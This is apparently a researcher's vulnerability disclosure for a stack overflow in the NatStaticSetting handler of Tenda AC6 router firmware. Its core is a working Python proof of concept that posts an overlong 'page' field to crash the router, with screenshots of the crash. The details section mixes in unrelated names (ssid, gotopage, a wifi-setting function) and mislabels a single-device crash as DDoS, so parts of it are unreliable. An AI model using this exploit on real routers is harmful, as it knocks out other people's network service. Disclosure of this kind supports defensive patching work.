# Information

**Vendor of the products:** Tenda

**Vendor's website:** [腾达(Tenda)官方网站](https://www.tenda.com.cn/)

**Reported by:** Wang Jinshuai(jinshuaiwang61@gmail.com) ，Zhao Jiangting(sta8r9@163.com)

**Affected products:** AC6V1.0 and AC6V2.0 Series Routers

**Affected firmware version:**  AC6V1.0升级软件V15.03.05.16,   AC6V1.0升级软件V15.03.05.19,   AC6V2.0升级软件_V15.03.06.23_multi

**Firmware download address:**[AC6V2.0升级软件](https://www.tenda.com.cn/material/show/102855)

# Overview

A **stack overflow vulnerability** in the `NatStaticSetting` function in the AC6V2.0 firmware upgrade _V15.03.06.23_multi allows an attacker to craft a very long `page` variable, causing a stack overflow, which then leads to a DDoS attack.

# Vulnerability details

Analyzing the `fromNatStaticSetting` function in this file reveals that when the value of the ssid variable is a very long string, such as 400 characters of "a", a stack overflow attack occurs because the gotopage variable, due to insufficient buffer length, overflows when the value is assigned via the sprintf function.

![image-20250312231545267](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202503122315976.png)

Cross-referencing the form_fast_setting_wifi_set function, it can be observed that it is indeed called by the formDefineTendDa function. As a result, an attacker can cause a DDoS attack on the router.

![image-20250312231728894](C:/Users/LENOVO/AppData/Roaming/Typora/typora-user-images/image-20250312231728894.png)



# Poc

By changing the IP and token to the target router's IP and token, the attack can be successfully carried out.

```python
import requests
ip='192.168.0.34'
url = f"http://{ip}/goform/NatStaticSetting"

headers = {
    "Host": "192.168.0.198",
    "Connection": "keep-alive",
    "Content-Length": "31",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://192.168.0.198",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://192.168.0.198/goform/WriteFacMac",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie": "password=wtfbro",
}

data = {
    "page": "a"*0x400,
}

response = requests.post(url, headers=headers, data=data)

print(response.status_code)
print(response.text)

```

# Attack Demonstration

At this point, the service is functioning normally.

![image-20250312223640285](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202503122240094.png)

The script attack was successful, causing a segmentation fault.

![image-20250312223758005](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202503122240127.png)

The service crashed.

![image-20250312223915278](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202503122240425.png)